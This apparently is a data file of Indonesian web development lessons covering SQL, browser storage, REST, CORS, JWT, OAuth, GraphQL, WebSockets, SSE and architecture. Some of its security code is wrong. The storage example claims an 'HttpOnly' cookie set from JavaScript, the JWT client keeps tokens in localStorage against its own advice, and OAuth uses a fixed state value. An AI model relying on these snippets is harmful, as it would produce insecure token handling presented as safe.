B.\" Kamu tentukan tabel tujuan, kolom yang diisi, dan nilai-nilanya.\n\n**3. UPDATE — Mengubah Data (Update)**\n\nUPDATE memperbarui data yang sudah ada. Seperti menyuruh, \"Ganti isi file nomor 5 dengan versi terbaru ini.\" Sangat penting untuk selalu pakai WHERE clause agar tidak mengubah semua baris secara tidak sengaja!\n\n**4. DELETE — Menghapus Data (Delete)**\n\nDELETE menghapus data dari tabel. Seperti menyuruh, \"Buang file nomor 5 dari lemari.\" Sama seperti UPDATE, selalu gunakan WHERE clause untuk menghapus hanya data yang dimaksud.\n\n**Relasi Antar Tabel dengan JOIN:**\n\nDalam aplikasi nyata, data tidak disimpan dalam satu tabel besar. Data dipecah ke beberapa tabel yang saling terhubung. JOIN memungkinkan kamu menggabungkan data dari beberapa tabel sekaligus dalam satu query.\n\n**Tips Keamanan: SQL Injection:**\n\nSelalu gunakan parameterized queries saat memasukkan data user ke SQL. Jangan pernah menggabungkan string langsung ke query — ini adalah celah keamanan paling umum dalam aplikasi web.",

    codeExample: { language: "sql", code: "-- Lihat semua produk\nSELECT * FROM products;\n\n-- Cari produk elektronik\nSELECT name, price FROM products WHERE category = 'elektronik';\n\n-- Urutkan termurah\nSELECT name, price FROM products ORDER BY price ASC;\n\n-- Hitung per kategori\nSELECT category, COUNT(*) as total\nFROM products GROUP BY category;\n\n-- Tambah produk\nINSERT INTO products (name, price, stock)\nVALUES ('Mouse Logitech', 150000, 50);\n\n-- Update stok\nUPDATE products SET stock = stock - 1 WHERE id = 5;\n\n-- Hapus produk\nDELETE FROM products WHERE id = 10;\n\n-- JOIN\nSELECT o.id, u.name, o.total\nFROM orders o\nJOIN users u ON o.user_id = u.id;" },

    explainAlong: "Baris 2: SELECT *. Baris 5: WHERE filter. Baris 8: ORDER BY. Baris 11-12: GROUP BY. Baris 15-16: INSERT. Baris 19: UPDATE. Baris 25-27: JOIN.",

    aiPrompt: "Jelaskan kenapa WHERE clause penting di UPDATE dan DELETE. Apa itu SQL injection?", reflection: "Coba buat database SQLite. Buat tabel products, masukkan 10 data, coba semua query."

  },

  {

    id: "4.5", moduleId: 4, chapterNum: "4.5", title: "Kapan Pakai Cookie, Storage, atau Database?", subtitle: "Memilih tempat penyimpanan yang tepat", level: "Menengah",

    objectives: ["Bisa memilih mekanisme penyimpanan yang tepat", "Mengerti trade-off masing-masing"],

    analogy: { diagram: "Pilih Tempat Sesuai Barang:\n\nToken login → Cookie (HttpOnly) → Aman, auto-kirim\nTheme UI    → localStorage      → Persisten, besar\nForm draft  → sessionStorage   → Hilang saat tutup\nData user   → Database (SQL)   → Terstruktur, aman\nLog aplikasi→ Database (NoSQL) → Fleksibel", caption: "Pilih penyimpanan sesuai kebutuhan" },

    explanation: "Sekarang kamu sudah kenal berbagai mekanisme penyimpanan.\n\nPertanyaannya: **kapan pakai yang mana?**\\n\\n**Cookie** — Untuk data sensitif yang perlu dikirim ke server setiap request.\\n- ✅ Token autentikasi (dengan HttpOnly + Secure)\\n- ❌ Max 4KB\\n\\n**localStorage** — Untuk data persisten dan tidak sensitif.\\n- ✅ Theme preference,\n\nCache\\n- ❌ Jangan simpan token JWT (rentan XSS)\\n\\n**sessionStorage** — Untuk data sementara.\\n- ✅ Form draft, state halaman\\n\\n**SQL Database** — Untuk data terstruktur.\\n- ✅ User, produk, transaksi\\n\\n**NoSQL Database** — Untuk data fleksibel berskala besar.\\n- ✅ Log, analytics, content",

    codeExample: { language: "javascript", code: "// DECISION TREE\nfunction simpanData(key, value, options = {}) {\n  const { sensitive, temporary } = options;\n  \n  if (sensitive) {\n    document.cookie = `${key}=${value}; HttpOnly; Secure`;\n  } else if (temporary) {\n    sessionStorage.setItem(key, JSON.stringify(value));\n  } else {\n    localStorage.setItem(key, JSON.stringify(value));\n  }\n}\n\n// CONTOH\nsimpanData('theme', 'dark', { sensitive: false });\nsimpanData('formDraft', { title: '' }, { temporary: true });" },

    explainAlong: "Baris 2-10: Decision tree. Baris 5: Sensitif → cookie. Baris 7: Sementara → sessionStorage. Baris 9: Default → localStorage.",

    aiPrompt: "Jelaskan kenapa tidak disarankan menyimpan JWT di localStorage. Apa risiko XSS?", reflection: "Analisis aplikasimu. Buat tabel: data apa, disimpan di mana, dan kenapa."

  },

];



// ============================================================

// MODUL 5: API & Komunikasi (7 chapters)

// ============================================================

const modul5: Chapter[] = [

  {

    id: "5.1", moduleId: 5, chapterNum: "5.1", title: "REST API: Aturan Main Berkomunikasi antar Sistem", subtitle: "Konsep REST, endpoint, resource, dan HTTP verbs", level: "Menengah",

    objectives: ["Memahami konsep REST API", "Bisa mendesain endpoint REST yang baik"],

    analogy: { diagram: "REST API = Menu Restoran:\n\nGET /menu    → Lihat semua menu\nGET /menu/1  → Lihat menu nomor 1\nPOST /menu   → Tambah menu baru\nPUT /menu/1  → Ganti menu nomor 1\nDEL /menu/1  → Hapus menu nomor 1", caption: "REST API seperti menu restoran — setiap endpoint punya fungsi spesifik" },

    explanation: "**REST API** adalah cara standar untuk aplikasi berkomunikasi melalui HTTP. REST = Representational State Transfer. Sederhananya, REST adalah aturan main bagaimana client dan server saling bertukar data.\\n\\n**Prinsip REST:**\\n1. **Resource-based** → Semua adalah resource (user, product, order).\\n2.\n\n**HTTP Verbs** → GET (baca), POST (buat), PUT (ganti), DELETE (hapus).\\n3. **Stateless** → Setiap request mandiri.\\n4. **Uniform Interface** → Format respons konsisten (biasanya JSON).\\n\\n**URL Design yang Baik:**\\n- ✅ Gunakan kata benda jamak: `/users`, `/orders`\\n- ✅ Gunakan hirarki: `/users/123/orders`\\n- ❌ Jangan pakai kata kerja: `/getUsers`",

    codeExample: { language: "javascript", code: "const API = 'https://api.example.com';\n\nconst getProducts = async () => {\n  const res = await fetch(`${API}/products`);\n  return res.json();\n};\n\nconst getProduct = async (id) => {\n  const res = await fetch(`${API}/products/${id}`);\n  if (res.status === 404) return null;\n  return res.json();\n};\n\nconst createProduct = async (data) => {\n  const res = await fetch(`${API}/products`, {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify(data)\n  });\n  return res.json();\n};\n\nconst updateProduct = async (id, data) => {\n  const res = await fetch(`${API}/products/${id}`, {\n    method: 'PUT',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify(data)\n  });\n  return res.json();\n};\n\nconst deleteProduct = async (id) => {\n  const res = await fetch(`${API}/products/${id}`, {\n    method: 'DELETE'\n  });\n  return res.status === 204;\n};" },

    explainAlong: "Baris 3-6: GET all. Baris 8-12: GET by ID. Baris 14-20: POST. Baris 22-28: PUT. Baris 30-34: DELETE.", aiPrompt: "Jelaskan prinsip stateless dalam REST.", reflection: "Cari API publik (JSONPlaceholder). Coba semua method CRUD-nya."

  },

  {

    id: "5.2", moduleId: 5, chapterNum: "5.2", title: "CORS: Kenapa Request dari Browser Sering Gagal?", subtitle: "Cross-Origin Resource Sharing dan cara mengatasinya", level: "Menengah",

    objectives: ["Memahami konsep same-origin policy dan CORS", "Bisa menangani error CORS"],

    analogy: { diagram: "Same-Origin = Komplek Perumahan:\n\n[google.com] ↔️ [google.com/maps] ✅ Same origin\n[google.com] →❌→ [facebook.com]    Cross-origin\n\nCORS = Surat Izin Masuk:\n[facebook.com] → 'Izin untuk google.com' → ✅", caption: "Same-origin policy seperti security komplek — CORS adalah surat izin" },

    explanation: "Kalau kamu pernah develop web dan ketemu error \\\"Access-Control-Allow-Origin\\\", itu namanya **CORS**.\\n\\n**Analoginya kayak komplek perumahan:**\\nPenghuni Komplek A (google.com) tidak bisa masuk ke Komplek B (facebook.com). Ini adalah **Same-Origin Policy** — kebijakan keamanan browser.\\n\\n**Kenapa ada aturan ini?**\\nUntuk mencegah website jahat mencuri data dari website lain.\\n\\n**Tapi kadang kita BUTUH akses cross-origin?**\\nBetul! Makanya ada **CORS** — mekanisme untuk mengizinkan akses cross-origin secara terkontrol.\\n\\n**Cara kerja CORS:**\\n1. Browser kirim **preflight request** (OPTIONS) ke server.\\n2.\n\nServer respond dengan header `Access-Control-Allow-Origin`.\\n3. Kalau origin diizinkan, browser lanjutkan request.",

    codeExample: { language: "javascript", code: "// HANDLE CORS DI SERVER (Express)\nconst cors = require('cors');\napp.use(cors({\n  origin: 'https://frontend.com',\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  allowedHeaders: ['Content-Type', 'Authorization']\n}));\n\n// FETCH DENGAN CREDENTIALS\nfetch('https://api.example.com/data', {\n  credentials: 'include'\n});" },

    explainAlong: "Baris 2-7: Middleware CORS. Baris 10-12: Fetch dengan credentials.", aiPrompt: "Jelaskan kenapa CORS hanya berlaku di browser, tidak di curl.", reflection: "Coba fetch ke API dari domain berbeda. Lihat error di Console."

  },

  {

    id: "5.3", moduleId: 5, chapterNum: "5.3", title: "Autentikasi: Session vs Token (JWT)", subtitle: "Cara kerja login dengan session dan JWT", level: "Menengah",

    objectives: ["Memahami perbedaan session-based dan token-based auth", "Bisa mengimplementasikan JWT authentication"],

    analogy: { diagram: "Session = Tanda Parkir #42:\n[Kasir] → 'Ini #42' → [Kamu] → Pulang → Kasir cek data #42\n\nJWT = Tiket Konser:\n[Tiket] = {nama: 'Budi', seat: 'A1'} + TANDA TANGAN\n[Penjaga] → Verifikasi tanda tangan → Izinkan", caption: "Session = referensi ke data di server, JWT = data self-contained" },

    explanation: "**Autentikasi** adalah proses memverifikasi identitas user. Ada dua pendekatan umum: **Session-based** dan **Token-based (JWT)**.\\n\\n**Session-based = Tanda Parkir**\\nKamu parkir → kasir kasih #42. Data lengkap ada di sistem kasir.\\n\\nDi web:\\n1. User login → server buat session ID → simpan di database.\\n2.\n\nSession ID dikirim ke client via cookie.\\n3. Client kirim cookie setiap request.\\n4. Server cek database: session valid?\\n\\n**JWT = Tiket Konser**\\nTiket berisi semua info + tanda tangan keamanan. Penjaga cukup verifikasi tanda tangan, tidak perlu cek database.\\n\\nDi web:\\n1.\n\nUser login → server buat JWT (user ID, nama) + signature.\\n2. JWT dikirim ke client.\\n3. Client kirim JWT di header Authorization.\\n4. Server verifikasi signature → tahu ini user siapa.\\n\\n**JWT Structure:** `header.payload.signature`",

    codeExample: { language: "javascript", code: "// JWT DI SERVER (Node.js)\nconst jwt = require('jsonwebtoken');\n\nconst login = (req, res) => {\n  const user = { id: 1, name: 'Budi' };\n  const token = jwt.sign(\n    { userId: user.id },\n    process.env.JWT_SECRET,\n    { expiresIn: '1h' }\n  );\n  res.json({ token });\n};\n\n// Middleware verifikasi\nconst auth = (req, res, next) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (!token) return res.status(401).json({ error: 'Token required' });\n  try {\n    req.user = jwt.verify(token, process.env.JWT_SECRET);\n    next();\n  } catch {\n    res.status(403).json({ error: 'Invalid token' });\n  }\n};\n\n// JWT DI CLIENT\nconst apiCall = async () => {\n  const token = localStorage.getItem('token');\n  const res = await fetch('/api/protected', {\n    headers: { 'Authorization': `Bearer ${token}` }\n  });\n  if (res.status === 401) window.location.href = '/login';\n  return res.json();\n};" },

    explainAlong: "Baris 4-10: Generate JWT. Baris 13-23: Middleware verifikasi. Baris 26-33: Client kirim JWT.", aiPrompt: "Jelaskan kenapa JWT disebut 'stateless'.", reflection: "Decode JWT di jwt.io. Lihat strukturnya."

  },

  {

    id: "5.4", moduleId: 5, chapterNum: "5.4", title: "OAuth 2.0: Login dengan Google/Facebook", subtitle: "Cara kerja OAuth 2.0 dan social login", level: "Menengah",

    objectives: ["Memahami alur OAuth 2.0 authorization code flow", "Bisa mengimplementasikan social login"],

    analogy: { diagram: "OAuth = Kartu Tamu Hotel:\n\n[Kamu] → 'Mau ke kamar 302' → [Resepsionis]\n  ↓\n[Resepsionis] → Telpon kamar 302 → 'Ada tamu?'\n  ↓\n[Penghuni 302] → 'Iya, izinkan' → [Kartu akses]\n  ↓\n[Kamu] → Pakai kartu → [Masuk]", caption: "OAuth seperti kartu tamu — user memberi izin aplikasi untuk akses data" },

    explanation: "**OAuth 2.0** adalah protokol untuk memberikan akses terbatas ke resource user tanpa memberikan password. Kamu pasti pernah lihat \\\"Login with Google\\\" — itu OAuth.\\n\\n**OAuth 2.0 Flow (Authorization Code):**\\n1. User klik \\\"Login with Google\\\".\\n2. Aplikasi redirect user ke Google: \\\"Ini aplikasi X, minta izin akses email.\\\"\\n3.\n\nUser login ke Google dan klik \\\"Izinkan\\\".\\n4. Google redirect balik dengan **authorization code**.\\n5. Aplikasi tukar code dengan **access token** (server-to-server).\\n6. Aplikasi pakai access token untuk ambil data user.\\n\\n**Kenapa tidak langsung kasih access token ke client?**\\nLebih aman!\n\nAuthorization code hanya bisa ditukar sekali dan memerlukan client secret.",

    codeExample: { language: "javascript", code: "// Step 1: Redirect ke Google OAuth\nconst redirectToGoogle = () => {\n  const params = new URLSearchParams({\n    client_id: 'YOUR_CLIENT_ID',\n    redirect_uri: 'http://localhost:3000/callback',\n    response_type: 'code',\n    scope: 'email profile',\n    state: 'random_state'\n  });\n  window.location.href = `https://accounts.google.com/o/oauth2/v2/auth?${params}`;\n};\n\n// Step 2: Handle callback\napp.get('/callback', async (req, res) => {\n  const { code } = req.query;\n  const tokenRes = await fetch('https://oauth2.googleapis.com/token', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n    body: new URLSearchParams({\n      code,\n      client_id: process.env.GOOGLE_CLIENT_ID,\n      client_secret: process.env.GOOGLE_CLIENT_SECRET,\n      redirect_uri: 'http://localhost:3000/callback',\n      grant_type: 'authorization_code'\n    })\n  });\n  const { access_token } = await tokenRes.json();\n  const userRes = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {\n    headers: { Authorization: `Bearer ${access_token}` }\n  });\n  const user = await userRes.json();\n  res.json({ message: 'Login berhasil!', user });\n});" },

    explainAlong: "Baris 2-11: Build URL authorization. Baris 14-35: Handle callback, tukar code dengan token.", aiPrompt: "Jelaskan bedanya authorization code flow vs implicit flow.", reflection: "Implementasi login with Google di proyekmu. Lihat alur redirect-nya."

  },

  {

    id: "5.5", moduleId: 5, chapterNum: "5.5", title: "GraphQL: Query yang Fleksibel", subtitle: "Perbedaan GraphQL dan REST, schema, query, dan mutation", level: "Menengah",

    objectives: ["Memahami konsep GraphQL dan bedanya dengan REST", "Bisa menulis query dan mutation GraphQL"],

    analogy: { diagram: "REST = Nasi Campur Tetap:\n'Pesan nasi campur' → Dapat semua lauk\n\nGraphQL = Build-Your-Own:\n'Nasi + ayam, TIDAK pakai tempe'\n(Hanya yang diminta)", caption: "GraphQL seperti menu custom — ambil hanya data yang dibutuhkan" },

    explanation: "**GraphQL** adalah query language untuk API yang dikembangkan Facebook. Bedanya dengan REST: di REST server yang menentukan data yang dikembalikan, di GraphQL **client** yang menentukan.\\n\\n**Keunggulan GraphQL:**\\n1. **Fetch exactly what you need** → Tidak over-fetching.\\n2. **Single endpoint** → Semua query ke `/graphql`.\\n3.\n\n**Strongly typed** → Schema jelas, auto-documentation.\\n4. **Nested data** → Ambil data relasi dalam 1 query.\\n\\n**GraphQL vs REST:**\\n| REST | GraphQL |\\n|------|---------|\\n| Banyak endpoint | Satu endpoint |\\n| Server tentukan response | Client tentukan response |\\n| Over/under fetching | Exact data |",

    codeExample: { language: "graphql", code: "# GRAPHQL QUERY\nquery GetUser {\n  user(id: 1) {\n    name\n    email\n    posts {\n      title\n      createdAt\n    }\n  }\n}\n\n# MUTATION\nmutation CreateUser {\n  createUser(input: { name: \"Budi\", email: \"budi@mail.com\" }) {\n    id\n    name\n    email\n  }\n}\n\n# FETCH DI JAVASCRIPT\nconst fetchGraphQL = async (query, variables = {}) => {\n  const res = await fetch('/graphql', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ query, variables })\n  });\n  return res.json();\n};" },

    explainAlong: "Baris 2-10: Query GraphQL. Baris 13-20: Mutation. Baris 23-30: Fetch GraphQL di JavaScript.", aiPrompt: "Jelaskan kenapa GraphQL tidak memerlukan versioning.", reflection: "Coba GraphQL di playground. Lihat auto-documentation-nya."

  },

  {

    id: "5.6", moduleId: 5, chapterNum: "5.6", title: "WebSocket: Komunikasi Real-Time Dua Arah", subtitle: "Perbedaan WebSocket dan HTTP, implementasi chat sederhana", level: "Menengah",

    objectives: ["Memahami konsep WebSocket dan full-duplex communication", "Bisa membuat aplikasi real-time sederhana"],

    analogy: { diagram: "HTTP = Surat (Kirim → Tunggu → Balasan)\nWebSocket = Telepon (Terbuka terus, real-time)", caption: "HTTP seperti surat — WebSocket seperti telepon" },

    explanation: "**WebSocket** adalah protokol komunikasi yang memungkinkan **dua arah** (full-duplex) antara client dan server melalui satu koneksi yang tetap terbuka.\\n\\n**Analoginya:** HTTP = Surat. WebSocket = Telepon.\\n\\n**Kenapa butuh WebSocket?**\\nHTTP tidak cocok untuk real-time:\\n- Polling boros (kirim request terus-menerus).\\n- Latency tinggi.\\n\\nWebSocket cocok untuk: Chat, live notification, real-time collaboration, live streaming data.\\n\\n**Cara kerja WebSocket:**\\n1. Client kirim HTTP request dengan header `Upgrade: websocket`.\\n2. Server setuju → koneksi di-upgrade jadi WebSocket.\\n3.\n\nKoneksi tetap terbuka, data bisa mengalir dua arah.\\n4. Kirim data dengan `ws.send()`, terima dengan `ws.onmessage`.",

    codeExample: { language: "javascript", code: "// WEBSOCKET CLIENT\nconst ws = new WebSocket('wss://chat.example.com');\n\nws.onopen = () => {\n  console.log('Connected!');\n  ws.send(JSON.stringify({ type: 'join', room: 'general' }));\n};\n\nws.onmessage = (event) => {\n  const data = JSON.parse(event.data);\n  if (data.type === 'message') {\n    console.log(`${data.from}: ${data.text}`);\n  }\n};\n\nws.onclose = () => console.log('Disconnected!');\n\nconst sendMessage = (text) => {\n  ws.send(JSON.stringify({ type: 'message', text }));\n};\n\n// WEBSOCKET SERVER\nconst WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', (ws) => {\n  ws.on('message', (message) => {\n    const data = JSON.parse(message);\n    wss.clients.forEach((client) => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(JSON.stringify(data));\n      }\n    });\n  });\n});" },

    explainAlong: "Baris 2-6: Koneksi dan join room. Baris 8-13: Handle pesan. Baris 26-33: Server broadcast.", aiPrompt: "Jelaskan bedanya WebSocket dan Server-Sent Events (SSE).", reflection: "Buat chat sederhana dengan WebSocket. Buka dua tab. Kirim pesan — apakah real-time?"

  },

  {

    id: "5.7", moduleId: 5, chapterNum: "5.7", title: "Server-Sent Events (SSE): Push Data dari Server", subtitle: "Stream data satu arah dari server ke client", level: "Menengah",

    objectives: ["Memahami konsep SSE dan bedanya dengan WebSocket", "Bisa mengimplementasikan notifikasi real-time dengan SSE"],

    analogy: { diagram: "SSE = Radio (Satu arah, banyak pendengar):\n[Stasiun] → 🎵 → [Pendengar A]\n        → 🎵 → [Pendengar B]", caption: "SSE seperti radio — server broadcast ke banyak client" },

    explanation: "**Server-Sent Events (SSE)** adalah teknologi untuk mengirim data real-time dari server ke client melalui satu koneksi HTTP yang tetap terbuka. Bedanya dengan WebSocket: SSE hanya **satu arah** (server → client).\\n\\n**SSE vs WebSocket:**\\n| Fitur | SSE | WebSocket |\\n|-------|-----|-----------|\\n| Arah | Server → Client | Dua arah |\\n| Protokol | HTTP | WebSocket |\\n| Reconnect | Auto | Manual |\\n| Cocok untuk | Notifikasi, feed | Chat, gaming |\\n\\n**Keunggulan SSE:**\\n1. Lebih simpel dari WebSocket.\\n2. Auto-reconnect bawaan.\\n3.\n\nBisa pakai HTTP.\\n4. Event ID untuk resume dari disconnect.",

    codeExample: { language: "javascript", code: "// SSE CLIENT\nconst eventSource = new EventSource('/api/notifications');\n\neventSource.onmessage = (event) => {\n  const data = JSON.parse(event.data);\n  console.log('Notifikasi:', data);\n};\n\neventSource.addEventListener('price-update', (event) => {\n  const price = JSON.parse(event.data);\n  updatePriceDisplay(price);\n});\n\neventSource.onerror = () => {\n  console.log('Auto-reconnect akan terjadi!');\n};\n\n// SSE SERVER\napp.get('/api/notifications', (req, res) => {\n  res.setHeader('Content-Type', 'text/event-stream');\n  res.setHeader('Cache-Control', 'no-cache');\n  res.setHeader('Connection', 'keep-alive');\n  \n  const interval = setInterval(() => {\n    const data = { time: new Date().toISOString() };\n    res.write(`data: ${JSON.stringify(data)}\\n\\n`);\n  }, 5000);\n  \n  req.on('close', () => clearInterval(interval));\n});" },

    explainAlong: "Baris 2-6: SSE connection dan message handler. Baris 8-11: Event spesifik. Baris 18-25: Server kirim data periodic.", aiPrompt: "Jelaskan kenapa SSE punya auto-reconnect bawaan.", reflection: "Implementasi notifikasi real-time dengan SSE. Coba disconnect — apakah auto-reconnect?"

  },

];



// ============================================================

// MODUL 6: Arsitektur & Pola Desain (5 chapters)

// ============================================================

const modul6: Chapter[] = [

  {

    id: "6.1", moduleId: 6, chapterNum: "6.1", title: "MPA vs SPA vs SSR vs SSG", subtitle: "Perbedaan arsitektur web modern", level: "Menengah-Lanjut",

    objectives: ["Memahami perbedaan MPA, SPA, SSR, dan SSG", "Bisa memilih arsitektur yang tepat"],

    analogy: { diagram: "MPA = Buku biasa (tiap halaman baru)\nSPA = Aplikasi Mobile (1 halaman, dinamis)\nSSR = Surat Kabar (sudah jadi saat dikirim)\nSSG = Buku Cetak (dibuat sebelumnya)", caption: "Empat pendekatan berbeda untuk membangun web" },

    explanation: "Ada empat pendekatan utama untuk membangun web modern:\n\n**MPA (Multi-Page Application)**\nSetiap klik = request halaman baru ke server. Contoh: Wikipedia.\n- ✅ SEO bagus, simple\n- ❌ Full page reload, tidak responsif\n\n**SPA (Single-Page Application)**\nSatu halaman, konten diubah dengan JavaScript. Contoh: Gmail.\n- ✅ Responsif, experience seperti aplikasi\n- ❌ SEO challenging, initial load lambat\n\n**SSR (Server-Side Rendering)**\nServer render HTML setiap request. Contoh: Next.js.\n- ✅ SEO bagus, initial load cepat\n- ❌ Server load tinggi\n\n**SSG (Static Site Generation)**\nHTML di-generate saat build time. Contoh: Blog Gatsby.\n- ✅ Cepat, bisa di-host di CDN\n- ❌ Tidak cocok untuk data real-time",

    codeExample: { language: "javascript", code: "// Next.js — SSR\nexport async function getServerSideProps() {\n  const res = await fetch('https://api.example.com/data');\n  const data = await res.json();\n  return { props: { data } };\n}\n\n// Next.js — SSG\nexport async function getStaticProps() {\n  const res = await fetch('https://api.example.com/data');\n  const data = await res.json();\n  return { props: { data }, revalidate: 60 };\n}\n\n// Next.js — ISR (Incremental Static Regeneration)\n// HTML di-generate saat build, lalu di-update periodic\nexport async function getStaticProps() {\n  const data = await fetchData();\n  return {\n    props: { data },\n    revalidate: 60 // Re-generate setiap 60 detik\n  };\n}" },

    explainAlong: "Baris 1-6: SSR — render setiap request. Baris 8-12: SSG — generate saat build. Baris 15-20: ISR — regenerasi periodik.", aiPrompt: "Jelaskan kapan menggunakan SSR vs SSG.", reflection: "Analisis website yang sedang kamu bangun. MPA, SPA, SSR, atau SSG?"

  },

  {

    id: "6.2", moduleId: 6, chapterNum: "6.2", title: "State Management: Mengelola Data Aplikasi", subtitle: "Redux, Context API, Zustand, dan kapan menggunakannya", level: "Menengah-Lanjut",

    objectives: ["Memahami konsep state management", "Bisa memilih library state management yang tepat"],

    analogy: { diagram: "State = Lemari Bersama di Kantor:\n\nTanpa State Management:\n[Meja A] Punya data X versi 1\n[Meja B] Punya data X versi 2 (beda!)\n\nDengan State Management:\n[Lemari Pusat] → Data X versi tunggal\n  ↓         ↓\n[Meja A]  [Meja B] (sama!)", caption: "State management seperti lemari pusat — satu sumber kebenaran" },

    explanation: "**State** adalah data yang mengendalikan tampilan dan perilaku aplikasi.\n\n**State Management** adalah cara mengelola data tersebut agar konsisten di seluruh aplikasi.\\n\\n**Kenapa butuh state management?**\\nTanpa state management:\\n- Meja A punya data X versi 1\\n- Meja B punya data X versi 2 (berbeda!)\\n\\nDengan state management:\\n- Satu lemari pusat berisi data X\\n- Semua meja mengambil dari lemari yang sama\\n\\n**Pilihan State Management:**\\n\\n**React Context** — Bawaan React,\n\nCocok untuk data yang jarang berubah.\\n- ✅ Tidak perlu library tambahan\\n- ❌ Re-render berlebihan kalau data sering berubah\\n\\n**Redux** — Library paling populer, predictable state container.\\n- ✅ DevTools bagus, ecosystem besar\\n- ❌ Boilerplate banyak\\n\\n**Zustand** — Lightweight alternative, minimal boilerplate.\\n- ✅ Simple, performa bagus\\n- ❌ Ecosystem lebih kecil",

    codeExample: { language: "javascript", code: "// REACT CONTEXT\nconst ThemeContext = createContext();\n\nfunction ThemeProvider({ children }) {\n  const [theme, setTheme] = useState('light');\n  return (\n    <ThemeContext.Provider value={{ theme, setTheme }}>\n      {children}\n    </ThemeContext.Provider>\n  );\n}\n\n// REDUX\nconst store = configureStore({\n  reducer: {\n    user: userSlice.reducer,\n    cart: cartSlice.reducer\n  }\n});\n\n// ZUSTAND\nconst useStore = create((set) => ({\n  count: 0,\n  increment: () => set((state) => ({ count: state.count + 1 })),\n  decrement: () => set((state) => ({ count: state.count - 1 }))\n}));\n\nfunction Counter() {\n  const { count, increment } = useStore();\n  return <button onClick={increment}>{count}</button>;\n}" },

    explainAlong: "Baris 1-9: React Context. Baris 11-16: Redux store. Baris 18-28: Zustand — minimal dan clean.", aiPrompt: "Jelaskan kapan menggunakan Context vs Redux vs Zustand.", reflection: "Proyekmu butuh state management? Coba Zustand — paling simple untuk pemula."

  },

  {

    id: "6.3", moduleId: 6, chapterNum: "6.3", title: "Monolith vs Microservices", subtitle: "Perbedaan arsitektur monolitik dan microservices", level: "Menengah-Lanjut",

    objectives: ["Memahami perbedaan monolith dan microservices", "Bisa memilih arsitektur yang tepat"],

    analogy: { diagram: "Monolith = Restoran All-in-One:\n[Dapur] + [Kasir] + [Pelayan] = 1 gedung\n\nMicroservices = Food Court:\n[Stall Burger] + [Stall Sushi] + [Stall Pizza]\n= Masing-masing independen", caption: "Monolith = satu kesatuan, Microservices = terpisah independen" },

    explanation: "**Monolith** = Seluruh aplikasi dalam satu codebase dan satu deployment.\\n**Microservices** = Aplikasi dipecah menjadi service-service kecil yang independen.\\n\\n**Analoginya:**\\nMonolith = Restoran all-in-one.\n\nDapur, kasir, pelayan — semua dalam 1 gedung.\n\nKalau dapur kebakaran, seluruh restoran tutup.\\n\\nMicroservices = Food court.\n\nStall burger, sushi, pizza — masing-masing independen.\n\nKalau stall burger tutup, sushi dan pizza tetap buka.\\n\\n**Monolith — Kapan dipakai?**\\n- ✅ Simple,\n\nDevelopment cepat\\n- ✅ Debugging mudah\\n- ✅ Cocok untuk tim kecil dan startup\\n- ❌ Skala terbatas\\n\\n**Microservices — Kapan dipakai?**\\n- ✅ Scalable — scale service yang perlu saja\\n- ✅ Tech stack berbeda per service\\n- ✅ Tim besar bisa kerja independen\\n- ❌ Kompleks — butuh DevOps, monitoring, distributed tracing",

    codeExample: { language: "javascript", code: "// MONOLITH — Semua dalam 1 app\n// app.js\nconst express = require('express');\nconst app = express();\n\napp.use('/users', require('./routes/users'));\napp.use('/orders', require('./routes/orders'));\napp.use('/products', require('./routes/products'));\n\napp.listen(3000);\n\n// MICROSERVICES — Service terpisah\n// user-service/index.js    → port 3001\n// order-service/index.js   → port 3002\n// product-service/index.js → port 3003\n\n// API Gateway — Gerbang masuk\nconst gateway = express();\ngateway.use('/users', proxy('http://user-service:3001'));\ngateway.use('/orders', proxy('http://order-service:3002'));\ngateway.listen(3000);" },

    explainAlong: "Baris 2-8: Monolith — semua route dalam 1 app. Baris 14-19: Microservices dengan API Gateway.", aiPrompt: "Jelaskan kapan pindah dari monolith ke microservices.", reflection: "Apakah proyekmu butuh microservices? Atau monolith masih cukup?"

  },

  {

    id: "6.4", moduleId: 6, chapterNum: "6.4", title: "Serverless: Fungsi di Cloud", subtitle: "Konsep serverless computing dan Function-as-a-Service", level: "Menengah-Lanjut",

    objectives: ["Memahami konsep serverless computing", "Bisa deploy function ke platform serverless"],

    analogy: { diagram: "Traditional = Sewa Rumah:\nBayar bulanan walau tidak tinggal\n\nServerless = Sewa Hotel:\nBayar hanya saat menginap\n(Tidak ada server yang nyala terus)", caption: "Serverless — bayar hanya saat kode berjalan" },

    explanation: "**Serverless** berarti kamu tidak perlu mengelola server. Kamu cuma tulis kode (fungsi), deploy ke cloud, dan platform yang menangani infrastruktur.\\n\\n**Analoginya:**\\nTraditional = Sewa rumah. Bayar bulanan walau sedang pergi liburan.\\n\\nServerless = Sewa hotel. Bayar hanya saat menginap.\n\nTidak ada rumah yang harus dirawat.\\n\\n**Keuntungan Serverless:**\\n1. **No server management** — Tidak perlu patch, update, atau monitor server.\\n2. **Auto-scale** — Dari 0 request sampai 1 juta, platform yang handle.\\n3. **Pay-per-use** — Bayar hanya saat fungsi berjalan.\\n4.\n\n**Fast deployment** — Deploy fungsi dalam detik.\\n\\n**Platform Serverless:**\\n- AWS Lambda\\n- Vercel Functions\\n- Netlify Functions\\n- Cloudflare Workers\\n\\n**Kapan TIDAK pakai serverless?**\\n- Long-running process (timeout biasanya 15 menit).\\n- Butuh state persistence (serverless stateless).\\n- Latency-sensitive (cold start bisa 100ms-1s).",

